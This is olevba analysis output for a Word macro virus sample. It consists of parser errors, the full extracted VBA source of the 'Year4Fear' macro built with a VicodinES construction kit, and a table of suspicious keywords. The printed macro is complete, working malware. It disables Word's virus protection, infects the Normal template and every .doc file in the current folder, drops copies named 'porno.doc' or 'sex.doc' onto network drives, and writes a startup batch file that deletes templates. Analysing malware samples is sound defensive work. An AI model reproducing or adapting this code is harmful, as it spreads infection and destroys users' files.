olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-006248bf4dccc218a6210f07335f7408f6196336363739f4589bf96c718ee2ab
Type: OLE
WARNING  invalid value for PROJECTLCIDINVOKE_Id expected 0014 got 0003
WARNING  invalid value for PROJECTLCIDINVOKE_Size expected 0004 got 0002
WARNING  invalid value for PROJECTLCIDINVOKE_LcidInvoke expected 0409 got 404E4
WARNING  invalid value for PROJECTCODEPAGE_Id expected 0003 got 0007
WARNING  invalid value for PROJECTCODEPAGE_Size expected 0002 got 72500000
WARNING  invalid value for PROJECTNAME_Id expected 0004 got 6365
ERROR    PROJECTNAME_SizeOfProjectName value not in range [1-128]: 1396
ERROR    Error in _extract_vba
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 3526, in extract_macros
    for stream_path, vba_filename, vba_code in \
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 2094, in _extract_vba
    project = VBA_Project(ole, vba_root, project_path, dir_path, relaxed)
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 1752, in __init__
    projectdocstring_id = struct.unpack("<H", dir_stream.read(2))[0]
struct.error: unpack requires a buffer of 2 bytes
-------------------------------------------------------------------------------
VBA MACRO Year4Fear 
in file: Virus.MSWord.VMPC-based-006248bf4dccc218a6210f07335f7408f6196336363739f4589bf96c718ee2ab - OLE stream: 'Year4Fear'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Year4Fear()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Live for Now"
    'Poppy ID : 508518333252
    
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
f17800 = u15253 & c7720 & Int(Rnd * 9785)
f7883 = u12395 & c11625 & Int(Rnd * 4355)
f12800 = u13793 & c5235 & Int(Rnd * 4381)
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k14082 = m10027 & e16614
f13264 = u1911 & c1103 & k7177 & m1911
ActiveDocument.ReadOnlyRecommended = False
k16393 = m4785 & e11732
f6670 = u10590 & c5877 & Int(Rnd * 2044)
k5802 = m15518 & e12490
k8867 = m11245 & e7137
k14331 = m10197 & e14682
If Month(Now()) = 2 And Day(Now()) = 29 Then Call p8277
f13503 = u8641 & c3571 & Int(Rnd * 506)
o183350854 = 0
k6117 = m18459 & e7738
Set er508518332 = MacroContainer
 f8251$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f2635 = u16589 & c12454 & k5706 & m16589
f9503 = u8133 & c12622 & Int(Rnd * 6201)
l82775085 = GetAttr(NormalTemplate.FullName)
If l82775085 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8251$)
If l82775085 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8251$)
f7146 = u14052 & c10815 & k6986 & m14052
If l82775085 = vbReadOnly Then GoTo fuckoff
k1552 = m11256 & e9356
If l82775085 = vbReadOnly + vbArchive Then GoTo fuckoff
k10615 = m2891 & e8939
f17252 = u17073 & c12978 & Int(Rnd * 9485)
k6175 = m10772 & e9592
If er508518332 = NormalTemplate Then o183350854 = 1
If o183350854 = 1 Then o0o183312 = NormalTemplate.FullName Else o0o183312 = ActiveDocument.FullName
f15121 = u14379 & c14568 & Int(Rnd * 6482)
If o183350854 = 1 Then bgt50857 = ActiveDocument.FullName Else bgt50857 = NormalTemplate.FullName
k7865 = m10106 & e9539
Application.OrganizerCopy Source:=o0o183312, Destination:=bgt50857, Name:="Year4Fear", Object:=wdOrganizerObjectProjectItems
If o183350854 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k17644 = m6093 & e7399
f5050 = u4853 & c14879 & Int(Rnd * 6067)
If o183350854 = 0 Then
f10729 = u5281 & c7442 & k14454 & m5281
     If NormalTemplate.Saved = False Then NormalTemplate.Save
k15773 = m9362 & e6563
f6908 = u7322 & c8346 & Int(Rnd * 3542)
     End If
k11580 = m7413 & e15283
f6503 = u13386 & c3097 & k8676 & m13386
k11895 = m10354 & e10531
'VMPCK v1.0b
fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Year4Fear
k7301 = m16994 & e16223
Dialogs(wdDialogFileNew).Show
k7836 = m3951 & e13612
    Skip = 1
f8407 = u14695 & c8110 & k9928 & m14695
k16145 = m4617 & e3665
    Call Year4Fear
End Sub
Sub FileSave()
    On Error Resume Next
f16741 = u10118 & c5566 & Int(Rnd * 2459)
    Call Year4Fear
k14273 = m17884 & e2830
f6622 = u11752 & c14331 & Int(Rnd * 4616)
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
k397 = m8877 & e16797
f5808 = u9660 & c9217 & Int(Rnd * 8656)
    Call Year4Fear
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f4415 = u5309 & c11616 & Int(Rnd * 1954)
k18197 = m10313 & e10284
    ActiveDocument.Close
k9669 = m15634 & e8091
End Sub
Sub ToolsOptions()
    On Error Resume Next
k7826 = m15059 & e13182
Dialogs(wdDialogToolsOptions).Show
f14533 = u13673 & c12851 & Int(Rnd * 4248)
    Call Year4Fear
k15446 = m17528 & e10885
End Sub
Sub EditFind()
    On Error Resume Next
k9918 = m15804 & e6160
Dialogs(wdDialogEditFind).Show
f13711 = u10460 & c3282 & Int(Rnd * 3904)
    Call Year4Fear
f9962 = u12027 & c3874 & Int(Rnd * 461)
k7634 = m7203 & e6969
End Sub
Sub FileSaveAs()
    On Error Resume Next
f11176 = u3832 & c9622 & Int(Rnd * 8262)
Dialogs(wdDialogFileSaveAs).Show
    Call Year4Fear
End Sub
Sub FilePrint()
    On Error Resume Next
k9296 = m10381 & e10989
Dialogs(wdDialogFilePrint).Show
    Call Year4Fear
f14580 = u2513 & c14397 & k16421 & m2513
End Sub
Sub FileExit()
    On Error Resume Next
    Call Year4Fear
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f7938 = u12354 & c7627 & Int(Rnd * 4571)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Year4Fear
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Year4Fear
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
k6670 = m2682 & e10623
f11925 = u7518 & c9504 & Int(Rnd * 8005)
End Sub
Sub AutoOpen()
    On Error Resume Next
f4189 = u3922 & c8219 & Int(Rnd * 2680)
    Call Year4Fear
End Sub
Sub AutoExit()
    On Error Resume Next
k15103 = m8431 & e9710
    Call Year4Fear
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Year4Fear
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Year4Fear
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub AutoExec()
    On Error Resume Next
k12075 = m9321 & e6317
    Call Year4Fear
k8045 = m9074 & e5324
End Sub
Sub AutoClose()
    On Error Resume Next
f4700 = u10878 & c5632 & Int(Rnd * 880)
f9092 = u9976 & c12757 & k7701 & m9976
    Call Year4Fear
f8581 = u13020 & c5346 & Int(Rnd * 5603)
f15734 = u10133 & c9528 & Int(Rnd * 8241)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Year4Fear
k6297 = m7428 & e13521
k3604 = m16954 & e15976
f3950 = u17190 & c5751 & k4951 & m17190
f18103 = u9558 & c10407 & k13422 & m9558
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Year4Fear
f8807 = u4407 & c8743 & k2201 & m4407
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Year4Fear
f1581 = u17765 & c14871 & Int(Rnd * 6437)
k8389 = m8171 & e16498
k2106 = m5478 & e12243
k13919 = m9897 & e11224
End Sub
Sub p8277()
    On Error Resume Next
f2557 = u12839 & c8150 & Int(Rnd * 3715)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "year"
            .Replacement.Text = "fear"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f12569 = u8183 & c7222 & Int(Rnd * 6703)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f11983 = u13971 & c5267 & k7564 & m13971
f14519 = u10600 & c8926 & k10287 & m10600
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
k3220 = m10780 & e13445
snag1$ = "c:\progra~1\micros~2\templa~1\"
k813 = m7094 & e15220
k6533 = m6677 & e6161
Part2$ = "del "
f9734 = u12910 & c5622 & k10344 & m12910
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f3365 = u12978 & c3796 & Int(Rnd * 3186)
f8579 = u5291 & c10491 & Int(Rnd * 830)
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.VMPC-based-006248bf4dccc218a6210f07335f7408f6196336363739f4589bf96c718ee2ab - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

